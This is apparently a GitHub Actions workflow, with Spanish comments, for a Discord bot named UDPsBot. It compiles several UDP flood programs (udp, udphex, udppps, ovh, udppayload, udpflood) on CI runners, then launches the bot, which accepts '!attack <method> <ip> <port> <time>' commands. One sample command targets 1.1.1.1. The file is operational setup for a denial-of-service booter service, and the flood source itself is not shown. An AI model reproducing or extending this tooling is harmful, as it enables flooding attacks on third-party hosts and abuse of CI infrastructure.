name: UDPsBot

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  build-and-run:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.21'

      - name: Install Python dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -U discord.py || true

      - name: Ensure build tools are available
        run: |
          sudo apt-get update
          sudo apt-get install -y build-essential

      - name: Build UDP binaries
        run: |
          # Compilar udp (antiguo udphexv1)
          if [ -f udp.c ]; then
            gcc -O3 -pthread -o udp udp.c || true
            echo "✓ Compilado: udp (de udp.c)"
            chmod +x udp
          else
            echo "✗ udp.c no encontrado"
          fi

          # Compilar udphex (antiguo udphexv2)
          if [ -f udphex.c ]; then
            gcc -O3 udphex.c -o udphex || true
            echo "✓ Compilado: udphex (de udphex.c)"
            chmod +x udphex
          else
            echo "✗ udphex.c no encontrado"
          fi

          # Compilar udppps
          if [ -f udppps.c ]; then
            gcc -O3 udppps.c -o udppps || true
            echo "✓ Compilado: udppps"
            chmod +x udppps
          else
            echo "✗ udppps.c no encontrado"
          fi

          # Compilar ovh.c
          if [ -f ovh.c ]; then
            gcc -O3 -pthread ovh.c -o ovh || true
            if [ -f ovh ]; then
              echo "✓ Compilado: ovh"
              chmod +x ovh
            fi
          else
            echo "✗ ovh.c no encontrado"
          fi

          # Compilar udppayload.c (nuevo método)
          if [ -f udppayload.c ]; then
            gcc -O3 -pthread udppayload.c -o udppayload || true
            if [ -f udppayload ]; then
              echo "✓ Compilado: udppayload (nuevo método)"
              chmod +x udppayload
            fi
          else
            echo "✗ udppayload.c no encontrado"
          fi

          # Verificar udpflood.go
          if [ -f udpflood.go ]; then
            echo "✓ Encontrado: udpflood.go"
            go build -o udpflood udpflood.go 2>/dev/null || echo "⚠ No se pudo compilar udpflood.go"
          else
            echo "✗ udpflood.go no encontrado"
          fi

          # Listar archivos
          echo ""
          echo "=== Archivos disponibles ==="
          for bin in udp udphex udppps ovh udppayload udpflood; do
            if [ -f "$bin" ]; then
              echo "✓ $bin (ejecutable)"
            elif [ -f "$bin.c" ] || [ -f "$bin.go" ]; then
              echo "✓ $bin (archivo fuente presente)"
            else
              echo "✗ $bin (no encontrado)"
            fi
          done
          echo "====================================="

      - name: Run bot with all methods
        env:
          KEYS: ${{ secrets.KEYS }}
        run: |
          echo "====================================="
          echo "Iniciando UDPHexBot con todos los métodos"
          echo "Comandos disponibles:"
          echo "  !attack udp <ip> <puerto> <tiempo>"
          echo "  !attack udphex <ip> <puerto> <tiempo>"
          echo "  !attack udppps <ip> <puerto> <tiempo>"
          echo "  !attack udpflood <ip> <puerto> <tiempo>"
          echo "  !attack ovh <ip> <puerto> <tiempo>"
          echo "  !attack udppayload <ip> <puerto> <tiempo> <payload>"
          echo "  !methods - Muestra información de métodos"
          echo ""
          echo "Ejemplo payload:"
          echo "  !attack udppayload 1.1.1.1 80 60 \"GET / HTTP/1.1\\r\\nHost: 1.1.1.1\\r\\n\\r\\n\""
          echo "====================================="
          
          echo ""
          echo "Iniciando bot..."
          python bot.py
